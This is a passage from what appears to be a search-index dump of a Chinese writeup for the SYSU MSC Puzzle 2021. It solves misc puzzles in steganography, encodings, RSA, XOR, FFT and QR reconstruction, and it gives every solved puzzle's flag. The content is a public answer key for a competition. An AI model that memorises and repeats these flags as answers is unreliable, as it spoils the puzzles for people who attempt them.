, \"00010001110001001101110001010\" , \"11011110111101111101111110100\" , \"00000000100100100101100011100\" , \"11111110100010100101101011100\" , \"10000010110010110100100011001\" , \"10111010100101100111111110100\" , \"10111010111001000110010100010\" , \"10111010001100010100110110111\" , \"10000010000111101111111111101\" , \"11111110101101010101110110000\" ] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image , ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [ 9 , 11 , 13 , 15 , 17 , 19 ] shuffle_2 = [ 10 , 12 , 14 , 16 , 18 ] head = data [: 9 ] tail = data [ 20 :] def body ( body_1 , body_2 ): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217 body = [] for i in range ( 5 ): body . append ( body_1 [ i ]) body . append ( body_2 [ i ]) body . append ( body_1 [ 5 ]) return [ data [ i ] for i in body ] def draw_img ( data ): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247 assert len ( data ) == 29 and len ( data [ 0 ]) == 29 img = Image . new ( 'RGB' , ( 31 , 31 ), ( 255 , 255 , 255 )) for i , row in enumerate ( data ): for j , pixel in enumerate ( row ): img . putpixel (( j + 1 , i + 1 ), ( 0 , 0 , 0 ) if pixel == \"1\" else ( 255 , 255 , 255 )) return img with tqdm ( total = 86400 ) as pbar : for body_1 in permutations ( shuffle_1 ): for body_2 in permutations ( shuffle_2 ): im = draw_img ( head + body ( body_1 , body_2 ) + tail ) barcodes = pyzbar . decode ( im ) pbar . update ( 1 ) if ( len ( barcodes ) == 0 ): continue for barcode in barcodes : barcodeData = barcode . data . decode ( \"utf-8\" ) print ( barcodeData ) plt . imshow ( im ) plt . show () \u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a flag\uff1amsc{You_ar3_g0od_4t_QR_Code}","title":"SYSU MSC Puzzle 2021"},{"location":"writeups/sysu_msc_puzzle/#sysu-msc-puzzle-2021-writeup","text":"MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f Abstract \u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 writeup\uff1a","title":"SYSU MSC Puzzle 2021 Writeup"},{"location":"writeups/sysu_msc_puzzle/#_1","text":"\u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a msc{He1lo_Wor1d}","title":"\u4f60\u597d\uff01\u52c7\u58eb"},{"location":"writeups/sysu_msc_puzzle/#_2","text":"-.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.-- \u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a msc{CODE_OF_THE_19TH_CENTURY}","title":"\u8001\u53e4\u8463"},{"location":"writeups/sysu_msc_puzzle/#_3","text":"\u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a msc{Wow_Y0u_f1nd_me}","title":"\u8eb2\u5728\u5899\u540e"},{"location":"writeups/sysu_msc_puzzle/#_4","text":"\u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a msc{Inv1sibility_P0tiOn}","title":"\u9690\u8eab\u836f\u6c34"},{"location":"writeups/sysu_msc_puzzle/#_5","text":"We, the rustling leaves, have a voice that answers the storms, but who are you so silent? I am _ ____. \u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{a_mere_flower}","title":"\u5b8c\u5f62\u586b\u7a7a"},{"location":"writeups/sysu_msc_puzzle/#_6","text":"\u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837 \u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f http://xn--9q8h.xn--dr8h.sysums.club/ \u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 dig xn--9q8h.xn--dr8h.sysums.club txt flag\uff1a msc{Domain_w1th_IDNs}","title":"\u53bb\u95ee\u5bfc\u822a"},{"location":"writeups/sysu_msc_puzzle/#_7","text":"The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] \u6240\u4ee5 flag\uff1a msc{12499142631077172}","title":"\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848"},{"location":"writeups/sysu_msc_puzzle/#_8","text":"\u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01 \u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a msc{WHEN}","title":"\u6211\u7684\u5496\u5561"},{"location":"writeups/sysu_msc_puzzle/#_9","text":"\u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq== \u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a msc{T0_4nother_Base64}","title":"\u8bbe\u8ba1\u5e08"},{"location":"writeups/sysu_msc_puzzle/#_10","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3 \u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86","title":"\u76d1\u542c\u7535\u8bdd"},{"location":"writeups/sysu_msc_puzzle/#_11","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a msc{Text_Hidd3n_Und6r_The_1mage}","title":"\u4e00\u5f20\u56fe\u7247"},{"location":"writeups/sysu_msc_puzzle/#_12","text":"..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ... \u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a 77 121 95 83 101 114 105 101 115 \u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{My_Series}","title":"\u6570\u5b57\u5e8f\u5217"},{"location":"writeups/sysu_msc_puzzle/#_13","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f \u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a \u626b\u63cf\u5f97\u5230 flag\uff1a msc{SSTV_transfer_image}","title":"\u672a\u77e5\u4fe1\u53f7"},{"location":"writeups/sysu_msc_puzzle/#_14","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png \u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f \u5bc6\u7801\u662f p455w0rd binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb 0xC23A \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6 \u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a msc{svg_The_vectors}","title":"\u53c8\u4e00\u5f20\u56fe\u7247"},{"location":"writeups/sysu_msc_puzzle/#_15","text":"\u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831 Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4 \u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] \u6240\u4ee5 flag\uff1a msc{3_1415927}","title":"\u76f2\u4eba\u6570\u5b66\u5bb6"},{"location":"writeups/sysu_msc_puzzle/#_16","text":"\u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\ubrainfuck \u8f93\u51fa\u5f97\u5230\uff1a =WYxy^WXArn(qs|p!-k<~<X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&@U<5.&;66&:047V@D[,r:60}55^{yX<3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u \u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP \u4e2d\u95f4\u5c31\u662f flag\uff1a msc{Too_y0ung_too_simp1y}","title":"\u6700\u5c0f\u7684\u8bed\u8a00"},{"location":"writeups/sysu_msc_puzzle/#_17","text":"\u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png \u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740 \u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b from PIL import Image ; print ( Image . open ( \"justcolor.png\" ) . getpixel (( 0 , 0 ))) \uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50 \u8bbf\u95ee\u5f97\u5230 flag\uff1a msc{Hide_IP_in_RGBA}","title":"\u4e00\u4e2a\u4f20\u8bf4"},{"location":"writeups/sysu_msc_puzzle/#_18","text":"\u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002 \u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a \u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002 \u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1a https://dev.w3.org/html5/html-author/charref \u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a msc{mainstacK}","title":"\u65f6\u95f4\u5546\u4eba"},{"location":"writeups/sysu_msc_puzzle/#_19","text":"\u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d \u76f4\u63a5\u4f7f\u7528 \u4e09\u8bcd\u5730\u5740 \u8c03\u6210\u82f1\u6587\u641c\u7d22 7PMM399R+FQ2 \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd ///flux.tank.pitch \u6240\u4ee5 flag\uff1a msc{flux_tank_pitch}","title":"\u8ffd\u8e2a\u76ee\u6807"},{"location":"writeups/sysu_msc_puzzle/#_20","text":"\u95ee\u9898 from Crypto.Util.number import * p = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd q = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579 n = p * q e = 0x10001 answer = b 'something you dont know' m = bytes_to_long ( answer ) c = pow ( m , e , n ) # c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c \u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) print ( long_to_bytes ( pow ( c , d , n ))) # b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}'","title":"\u7d27\u6025\u5524\u9192"},{"location":"writeups/sysu_msc_puzzle/#emojis","text":"\u201c\u8fd9\u662f\u4e00\u4e32 EMOJI \uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139 \u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~ DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes \u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 EMOJI \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a ORANGE RED YELLOW GREEN GOLD \u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a msc{32400000}","title":"Emojis"},{"location":"writeups/sysu_msc_puzzle/#_21","text":"\u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a 0x66 \uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 0x66 \uff1a import struct res = [] with open ( \"msc.enc\" , \"rb\" ) as f : while True : c = f . read ( 1 ) if not c : break res . append ( ord ( c ) ^ 0x66 ) with open ( \"res.bin\" , \"wb\" ) as f : for each in res : f . write ( struct . pack ( \"B\" , each )) \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 FL Keys \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a msc{The_xor_midi_GIFT}","title":"\u7b80\u6613\u52a0\u5bc6"},{"location":"writeups/sysu_msc_puzzle/#_22","text":"\u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 \u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 0.8560967955058971 17.682512473330895 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip \u9898\u76ee\u4ee3\u7801 import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data def fft ( img ): fft = np . fft . fft2 ( img ) fft = np . fft . fftshift ( fft ) m = np . log ( np . abs ( fft )) p = np . angle ( fft ) return m , p if __name__ == '__main__' : img = cv2 . imread ( f 'answer.png' , cv2 . IMREAD_GRAYSCALE ) m , p = fft ( img ) print ( m . min (), m . max ()) new_img1 = mapping ( m ) new_img2 = mapping ( p ) cv2 . imwrite ( f 'cv1.png' , new_img1 ) cv2 . imwrite ( f 'cv2.png' , new_img2 ) \u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data if __name__ == '__main__' : img1 = cv2 . imread ( \"cv1.png\" , cv2 . IMREAD_GRAYSCALE ) img2 = cv2 . imread ( \"cv2.png\" , cv2 . IMREAD_GRAYSCALE ) m = mapping ( img1 , 0.8560967955058971 , 17.682512473330895 ) p = mapping ( img2 , 0 , 2 * np . pi ) res = m * ( np . cos ( p ) + np . sin ( p ) * 1 j ) ishift = np . fft . ifftshift ( res ) iimg = np . fft . ifft2 ( ishift ) iimg = np . abs ( iimg ) iimg = mapping ( iimg ) cv2 . imwrite ( f 'answer.png' , iimg ) flag: msc{The_master_of_cv}","title":"\u56fe\u50cf\u5904\u7406\u5927\u5e08"},{"location":"writeups/sysu_msc_puzzle/#_23","text":"\u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f \u9898\u76ee [ \"10111010111000011000001011101\" , \"00111010110010101000000000010\" , \"11100001101100100001011010110\" , \"10000010000111101111111111101\" , \"10111010000010001000001011101\" , \"01110011010111001001011100001\" , \"10101101110101001110000110010\" , \"10111010111010111110001011101\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"11001010001011011000000001000\" , \"10111010100101100111111110100\" , \"10000010110010110100100011001\" , \"11111110101010101010101111111\" , \"10111010001100010100110110111\" , \"11111110101101010101110110000\" , \"00000000100100100101100011100\" , \"00000000111001101011011111001\" , \"11111100100110010010001011110\" , \"00010001110001001101110001010\" , \"10000010111110001101101000001\" , \"11001110110110010101100100001\" , \"11011110111101111101111110100\" , \"11111110100010100101101011100\" , \"00000000011111011001100000000\" , \"10111010111001000110010100010\" , \"11111110101110011001001111111\" , \"10000010001100011010101000001\" , \"10011111111101000101110010111\" ] \u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a \u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 2*5!*6! = 172800 \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar 